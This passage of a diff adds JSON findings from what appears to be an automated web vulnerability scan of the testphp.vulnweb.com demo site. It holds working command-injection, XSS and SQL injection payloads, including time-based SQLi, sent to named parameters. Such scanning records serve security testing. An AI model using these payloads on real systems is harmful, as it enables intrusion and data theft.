+        "detected_at": "2026-02-07 16:24:58",
+        "unix_timestamp": 1770477898
+      }
+    },
+    {
+      "id": 67,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "\\n/usr/bin/id\\n",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2188
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:59",
+        "unix_timestamp": 1770477899
+      }
+    },
+    {
+      "id": 68,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 483
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:40",
+        "unix_timestamp": 1770478120
+      }
+    },
+    {
+      "id": 69,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "\"><script>alert(1)</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 476
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:41",
+        "unix_timestamp": 1770478121
+      }
+    },
+    {
+      "id": 70,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "' onfocus=alert(1) autofocus='",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 479
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:41",
+        "unix_timestamp": 1770478121
+      }
+    },
+    {
+      "id": 71,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<IMG SRC=\"javascript:alert(1);\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 491
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:42",
+        "unix_timestamp": 1770478122
+      }
+    },
+    {
+      "id": 72,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<ScRiPt>alert(1)</sCrIpT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 466
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:42",
+        "unix_timestamp": 1770478122
+      }
+    },
+    {
+      "id": 73,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 516
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:43",
+        "unix_timestamp": 1770478123
+      }
+    },
+    {
+      "id": 74,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 479
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:43",
+        "unix_timestamp": 1770478123
+      }
+    },
+    {
+      "id": 75,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<body onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 453
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:44",
+        "unix_timestamp": 1770478124
+      }
+    },
+    {
+      "id": 76,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<details open ontoggle=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 483
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:44",
+        "unix_timestamp": 1770478124
+      }
+    },
+    {
+      "id": 77,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<img src=x onerror=\"alert(1)\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 483
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:44",
+        "unix_timestamp": 1770478124
+      }
+    },
+    {
+      "id": 78,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 473
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:45",
+        "unix_timestamp": 1770478125
+      }
+    },
+    {
+      "id": 79,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 489
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:45",
+        "unix_timestamp": 1770478125
+      }
+    },
+    {
+      "id": 80,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<marquee onstart=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 465
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:45",
+        "unix_timestamp": 1770478125
+      }
+    },
+    {
+      "id": 81,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 482
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:46",
+        "unix_timestamp": 1770478126
+      }
+    },
+    {
+      "id": 82,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<svg onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 450
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:46",
+        "unix_timestamp": 1770478126
+      }
+    },
+    {
+      "id": 83,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<script>alert(1)</script>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 466
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:47",
+        "unix_timestamp": 1770478127
+      }
+    },
+    {
+      "id": 84,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "<video><source onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 487
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:47",
+        "unix_timestamp": 1770478127
+      }
+    },
+    {
+      "id": 85,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 564
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:48",
+        "unix_timestamp": 1770478128
+      }
+    },
+    {
+      "id": 86,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "' UNION SELECT NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 442
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:49",
+        "unix_timestamp": 1770478129
+      }
+    },
+    {
+      "id": 87,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 459
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:50",
+        "unix_timestamp": 1770478130
+      }
+    },
+    {
+      "id": 88,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/hpp/",
+      "parameter": "pp",
+      "payload": "-1 UNION SELECT 1,2,3--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 450
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:28:51",
+        "unix_timestamp": 1770478131
+      }
+    },
+    {
+      "id": 89,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2551
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:33",
+        "unix_timestamp": 1770478173
+      }
+    },
+    {
+      "id": 90,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2501
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:34",
+        "unix_timestamp": 1770478174
+      }
+    },
+    {
+      "id": 91,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2505
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:34",
+        "unix_timestamp": 1770478174
+      }
+    },
+    {
+      "id": 92,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2522
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:35",
+        "unix_timestamp": 1770478175
+      }
+    },
+    {
+      "id": 93,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "' UNION SELECT NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2517
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:35",
+        "unix_timestamp": 1770478175
+      }
+    },
+    {
+      "id": 94,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2506
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:35",
+        "unix_timestamp": 1770478175
+      }
+    },
+    {
+      "id": 95,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2504
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:36",
+        "unix_timestamp": 1770478176
+      }
+    },
+    {
+      "id": 96,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "1' AND '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2508
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:37",
+        "unix_timestamp": 1770478177
+      }
+    },
+    {
+      "id": 97,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2507
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:37",
+        "unix_timestamp": 1770478177
+      }
+    },
+    {
+      "id": 98,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "1' ORDER BY 1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2510
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:38",
+        "unix_timestamp": 1770478178
+      }
+    },
+    {
+      "id": 99,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "1' AND SLEEP(5)--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2512
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:38",
+        "unix_timestamp": 1770478178
+      }
+    },
+    {
+      "id": 100,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/product.php",
+      "parameter": "pic",
+      "payload": "1' ORDER BY 10--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pic"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2511
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:29:38",
